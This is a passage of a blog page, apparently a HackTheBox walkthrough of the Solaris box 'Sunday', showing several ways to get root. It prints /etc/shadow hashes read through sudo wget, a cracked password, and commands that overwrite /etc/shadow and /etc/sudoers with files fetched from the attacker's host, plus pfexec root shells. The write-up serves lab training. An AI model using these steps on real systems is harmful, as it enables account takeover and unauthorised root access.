+<span class="go">Host: 10.10.14.46:1234</span>
+<span class="go">Connection: Keep-Alive</span>
+<span class="go">Content-Type: application/x-www-form-urlencoded</span>
+<span class="go">Content-Length: 33</span>
+
+<span class="go">fb????????????????????????????b8</span>
+</pre></div>
+
+
+<h3 id="3-modify-the-etcshadow">3. Modify the /etc/shadow</h3>
+<p>Using the same concept we can read the /etc/shadow and get the root password hash. Then we can try to crack it as we did previously.</p>
+<div class="highlight"><pre><span></span><span class="gp">sammy@sunday:~$</span> sudo wget -i /etc/shadow 
+<span class="go">/etc/shadow: Invalid URL root:$5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD:14146::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL daemon:NP:6445::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL bin:NP:6445::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL sys:NP:6445::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL adm:NP:6445::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL lp:NP:6445::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL uucp:NP:6445::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL nuucp:NP:6445::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL dladm:*LK*:::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL smmsp:NP:6445::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL listen:*LK*:::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL gdm:*LK*:::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL zfssnap:NP:::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL xvm:*LK*:6445::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL mysql:NP:::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL openldap:*LK*:::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL webservd:*LK*:::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL postgres:NP:::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL svctag:*LK*:6445::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL nobody:*LK*:6445::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL noaccess:*LK*:6445::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL nobody4:*LK*:6445::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::: Unsupported scheme</span>
+<span class="go">/etc/shadow: Invalid URL sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::: Unsupported scheme</span>
+<span class="go">No URLs found in /etc/shadow.</span>
+</pre></div>
+
+
+<p>As I did per sammy, similarly  I could apply the same procedure for root to crack the hash but there is a simpler way and less time consuming way. We can simply change the hash of root and replace it with something else, for instance with sammy's hash. Let's try that</p>
+<p>I copy sunday /etc/shadow content on my kali box and I replace the root hash with sammy's as follows:</p>
+<div class="highlight"><pre><span></span><span class="gp">root:$5$Ebkn8jlK$</span>i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:14146::::::
+<span class="go">daemon:NP:6445::::::</span>
+<span class="go">bin:NP:6445::::::</span>
+<span class="go">sys:NP:6445::::::</span>
+<span class="go">adm:NP:6445::::::</span>
+<span class="go">lp:NP:6445::::::</span>
+<span class="go">uucp:NP:6445::::::</span>
+<span class="go">nuucp:NP:6445::::::</span>
+<span class="go">dladm:*LK*:::::::</span>
+<span class="go">smmsp:NP:6445::::::</span>
+<span class="go">listen:*LK*:::::::</span>
+<span class="go">gdm:*LK*:::::::</span>
+<span class="go">zfssnap:NP:::::::</span>
+<span class="go">xvm:*LK*:6445::::::</span>
+<span class="go">mysql:NP:::::::</span>
+<span class="go">openldap:*LK*:::::::</span>
+<span class="go">webservd:*LK*:::::::</span>
+<span class="go">postgres:NP:::::::</span>
+<span class="go">svctag:*LK*:6445::::::</span>
+<span class="go">nobody:*LK*:6445::::::</span>
+<span class="go">noaccess:*LK*:6445::::::</span>
+<span class="go">nobody4:*LK*:6445::::::</span>
+<span class="gp">sammy:$5$Ebkn8jlK$</span>i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+<span class="gp">sunny:$5$iRMbpnBv$</span>Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+</pre></div>
+
+
+<p>Then I start an http server with python on my kali box</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/sunday#</span> python -m SimpleHTTPServer
+<span class="go">Serving HTTP on 0.0.0.0 port 8000 ...</span>
+</pre></div>
+
+
+<p>and then I use wget to download the file and overwrite the existing /etc/shadow (using the -O option to overwrite it).</p>
+<div class="highlight"><pre><span></span><span class="gp">sammy@sunday:~#</span> sudo wget <span class="m">10</span>.10.14.46:8000/shadow -O /etc/shadow
+<span class="go">--10:10:20--  http://10.10.14.46:8000/shadow</span>
+<span class="go">           =&gt; `/etc/shadow&#39;</span>
+<span class="go">Connecting to 10.10.14.46:8000... connected.</span>
+<span class="go">HTTP request sent, awaiting response... 200 OK</span>
+<span class="go">Length: 634 [application/octet-stream]</span>
+
+<span class="go">100%[==================================================================================================================&gt;] 634           --.--K/s             </span>
+
+<span class="go">10:10:20 (60.28 MB/s) - `/etc/shadow&#39; saved [634/634]</span>
+</pre></div>
+
+
+<p>then we can switch to the root user providing sammy's password (cooldude!) and we are in!</p>
+<div class="highlight"><pre><span></span><span class="gp">sammy@sunday:~$</span> su -
+<span class="go">Password: </span>
+<span class="go">Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008</span>
+<span class="go">You have new mail.</span>
+<span class="gp">root@sunday:~#</span> id
+<span class="go">uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon)</span>
+<span class="gp">root@sunday:~#</span>
+</pre></div>
+
+
+<h3 id="4-modify-the-etcsudoers">4. Modify the /etc/sudoers</h3>
+<p>based on the info we gathered for both sunny and sunday, the sudoers file in the box should contain at least this:</p>
+<div class="highlight"><pre><span></span><span class="go">root  ALL=(ALL) ALL</span>
+<span class="go">sammy ALL=(root) NOPASSWD: /usr/bin/wget</span>
+<span class="go">sunny ALL=(root) NOPASSWD: /root/troll</span>
+</pre></div>
+
+
+<p>so i can tamper this file with the same procedure used on point 2. and have this instead:</p>
+<div class="highlight"><pre><span></span><span class="go">root  ALL=(ALL) ALL</span>
+<span class="go">sammy ALL=(root) NOPASSWD: /usr/bin/su</span>
+<span class="go">sunny ALL=(root) NOPASSWD: /root/troll</span>
+</pre></div>
+
+
+<p>I have replaced wget with <strong>su</strong>. Then I open a simple python http server and download and overwrite the sudoers file with wget</p>
+<div class="highlight"><pre><span></span><span class="gp">sammy@sunday:~$</span> sudo wget <span class="m">10</span>.10.14.46:8000/sudoers -O /etc/sudoers
+<span class="go">--19:07:07--  http://10.10.14.46:8000/sudoers</span>
+<span class="go">           =&gt; `/etc/sudoers&#39;</span>
+<span class="go">Connecting to 10.10.14.46:8000... connected.</span>
+<span class="go">HTTP request sent, awaiting response... 200 OK</span>
+<span class="go">Length: 98 [application/octet-stream]</span>
+
+<span class="go">100%[==================================================================================================================&gt;] 98            --.--K/s             </span>
+
+<span class="go">19:07:07 (22.31 MB/s) - `/etc/sudoers&#39; saved [98/98]</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="gp">sammy@sunday:~$</span> sudo -l
+<span class="go">User sammy may run the following commands on this host:</span>
+<span class="go">    (root) NOPASSWD: /usr/bin/su</span>
+</pre></div>
+
+
+<p>Once this is done I can simply  become root as follow:</p>
+<div class="highlight"><pre><span></span><span class="gp">sammy@sunday:~$</span> sudo su
+<span class="gp">root@sunday:~#</span> id
+<span class="go">uid=0(root) gid=0(root)</span>
+</pre></div>
+
+
+<h3 id="5-leveraging-pfexec">5. leveraging pfexec</h3>
+<p>Lastly I found another method which is interesting. I know Linux and I know that Solaris is another unix system hence has a lot of similarities with Linux. However, I didn't know a particular Solaris command, <strong><em>pfexec</em></strong>.</p>
+<p><strong><em>pfexec</em></strong> provides a RBAC (Role Based Access Control) mechanism and is basicaly the passwordless version of sudo. More info are available at <a href="https://docs.oracle.com/cd/E36784_01/html/E36870/pfexec-1.html">the official oracle website</a>. </p>
+<div class="highlight"><pre><span></span><span class="gp">sammy@sunday:~$</span> cat /etc/user_attr                                             
+<span class="gp">#</span>                                                                              
+<span class="gp">#</span> Copyright <span class="m">2008</span> Sun Microsystems, Inc.  All rights reserved.                  
+<span class="gp">#</span> Use is subject to license terms.                                             
+<span class="gp">#</span>                                                                              
+<span class="gp">#</span> CDDL HEADER START                                                            
+<span class="gp">#</span>                                                                              
+<span class="gp">#</span> The contents of this file are subject to the terms of the                    
+<span class="gp">#</span> Common Development and Distribution License <span class="o">(</span>the <span class="s2">&quot;License&quot;</span><span class="o">)</span>.                 
+<span class="gp">#</span> You may not use this file except in compliance with the License.             
+<span class="gp">#</span>                                                                              
+<span class="gp">#</span> You can obtain a copy of the license at usr/src/OPENSOLARIS.LICENSE          
+<span class="gp">#</span> See the License <span class="k">for</span> the specific language governing permissions              
+<span class="gp">#</span> and limitations under the License.                                           
+<span class="gp">#</span>                                                                              
+<span class="gp">#</span> When distributing Covered Code, include this CDDL HEADER in each   
+<span class="gp">#</span> file and include the License file at usr/src/OPENSOLARIS.LICENSE.            
+<span class="gp">#</span> If applicable, add the following below this CDDL HEADER, with the            
+<span class="gp">#</span> fields enclosed by brackets <span class="s2">&quot;[]&quot;</span> replaced with your own identifying          
+<span class="gp">#</span>                                                                                                                                                             
+<span class="gp">#</span> CDDL HEADER END                                                                                                                                             
+<span class="gp">#</span>                                                                                                                                                             
+<span class="gp">#</span> /etc/user_attr                                                                                                                                              
+<span class="gp">#</span>                                                                                                                                                             
+<span class="gp">#</span> user attributes. see user_attr<span class="o">(</span><span class="m">4</span><span class="o">)</span>                                                                                                                           
+<span class="gp">#</span>                                                                                                                                                             
+<span class="gp">#</span>                                                                                                                                                             
+<span class="go">adm::::profiles=Log Management                                                                                                                                </span>
+<span class="go">dladm::::auths=solaris.smf.manage.wpa,solaris.smf.modify                                                                                                      </span>
+<span class="go">lp::::profiles=Printer Management                                                                                                                             </span>
+<span class="go">postgres::::type=role;profiles=Postgres Administration,All                                                                                                    </span>
+<span class="go">root::::type=role;auths=solaris.*,solaris.grant;profiles=All;lock_after_retries=no;min_label=admin_low;clearance=admin_high</span>
+<span class="go">zfssnap::::type=role;auths=solaris.smf.manage.zfs-auto-snapshot;profiles=ZFS File System Management</span>
+<span class="go">sammy::::profiles=Primary Administrator;roles=root</span>
+</pre></div>
+
+
+<p>Looking at the /etc/user_attr file (similar to the sudoers file in linux) we notice that sammy is listed there and has been given root role.</p>
+<p>So we can simply run anything we want using sammy and the pfexec command. For example we can run the following to get root.txt output</p>
+<div class="highlight"><pre><span></span><span class="gp">sammy@sunday:~$</span> pfexec cat /root/root.txt
+<span class="go">fb????????????????????????????b8</span>
+</pre></div>
+
+
+<p>or we can just run the below to get a bash shell as root:</p>
+<div class="highlight"><pre><span></span><span class="gp">sammy@sunday:~$</span> pfexec bash
+<span class="gp">sammy@sunday:~#</span> id
+<span class="go">uid=0(root) gid=0(root) groups=10(staff)</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Sunday.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Sunday"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
